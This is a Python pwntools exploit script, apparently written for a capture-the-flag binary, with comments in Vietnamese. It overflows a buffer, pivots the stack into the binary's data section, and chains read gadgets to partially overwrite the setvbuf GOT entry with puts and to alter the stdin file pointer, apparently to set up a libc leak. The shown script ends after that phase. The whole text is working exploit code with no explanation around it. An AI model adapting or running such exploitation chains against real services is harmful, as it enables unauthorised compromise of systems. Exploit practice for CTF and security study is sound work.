#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401179
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()
# GDB()

stdin_target_byte = p8((libc.sym['_IO_2_1_stdin_'] & 0xFF) + 8)
puts_low_2bytes   = p16(libc.sym.puts & 0xFFFF)

# Addresses
SETVBUF_GOT = exe.got['setvbuf'] 
READ_GADGET = 0x0000000000401162
MAIN_SYM    = exe.sym['main']

# =============================================================================
# PHASE 1: SETUP ONE-SHOT CHAIN
# =============================================================================
log.info("--- PHASE 1: SETUP ONE-SHOT CHAIN ---")

log.info("Pivoting to 0x404088...")
input("ENTER")
p.send(flat(b"A"*64, 0x404088, READ_GADGET))

chain = flat({
    # --- BLOCK 1: SAU KHI GHI SETVBUF ---
    # Sau khi ghi setvbuf, leave sẽ pop RBP từ 0x404048 và ret từ 0x404050
    0:  0x404070,    # [0x404048] RBP cho Bước 2 (Target Stdin)
    8:  READ_GADGET, # [0x404050] Ret Bước 1 -> Nhảy sang Read Bước 2
    
    # --- TRÁNH CRASH GIỮA CHỪNG ---
    # Nếu vì lý do gì đó RSP bị kẹt ở 0x404058, hãy đặt MAIN ở đó để cứu vãn
    16: MAIN_SYM,    # [0x404058] Phao cứu sinh 1
    24: MAIN_SYM,    # [0x404060] Phao cứu sinh 2
    32: MAIN_SYM,    # [0x404068] Phao cứu sinh 3
    
    # --- BLOCK 2: SAU KHI GHI STDIN ---
    # Sau khi ghi stdin, leave sẽ pop RBP từ 0x404070 và ret từ 0x404078
    48: MAIN_SYM,    # [0x404078] ĐÍCH ĐẾN CUỐI CÙNG: VỀ MAIN
    
    # --- KÍCH HOẠT ---
    64: 0x404048,    # [0x404088] RBP cho Bước 1 (Target Setvbuf)
    72: READ_GADGET  # [0x404090] Kích hoạt Bước 1
})

log.info("Sending Chain...")
input("ENTER")

p.send(chain)
time.sleep(0.1)

log.info("--- PHASE 2: AUTO EXECUTE ---")

log.info("Writing Setvbuf -> Puts...")
input("ENTER")

p.send(puts_low_2bytes)
time.sleep(0.1)

log.info("Writing Stdin -> Stdin+8...")
input("ENTER")
p.send(stdin_target_byte)

time.sleep(0.1)